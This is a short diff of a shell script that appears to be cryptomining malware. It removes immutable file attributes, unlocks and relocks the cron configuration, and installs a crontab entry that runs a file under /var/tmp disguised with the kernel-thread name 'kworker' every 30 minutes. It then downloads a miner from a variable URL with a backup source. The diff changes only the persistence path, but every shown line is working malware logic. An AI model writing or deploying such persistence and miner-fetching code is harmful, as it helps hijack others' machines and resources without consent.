@@ -650,11 +650,11 @@ else
     chattr -R -ia /var/tmp/javae* /var/tmp/kworker*
     if [ ! -f "/usr/bin/crontab" ]; then
         unlock_cron
-        echo "*/30 * * * * bash /var/tmp/kworker >/dev/null 2>&1" >> "$crondir"
+        echo "*/30 * * * * bash /var/tmp/kworker/kworker >/dev/null 2>&1" >> "$crondir"
         lock_cron
     else
         unlock_cron
-        [[ $cont =~ "kworker" ]] || (crontab -l; echo "*/30 * * * * bash /var/tmp/kworker >/dev/null 2>&1") | crontab -
+        [[ $cont =~ "kworker" ]] || (crontab -l; echo "*/30 * * * * bash /var/tmp/kworker/kworker >/dev/null 2>&1") | crontab -
         lock_cron
     fi
     download_file_if_needed "$miner_url" "/var/tmp/javae/javae" "$miner_url_backup"
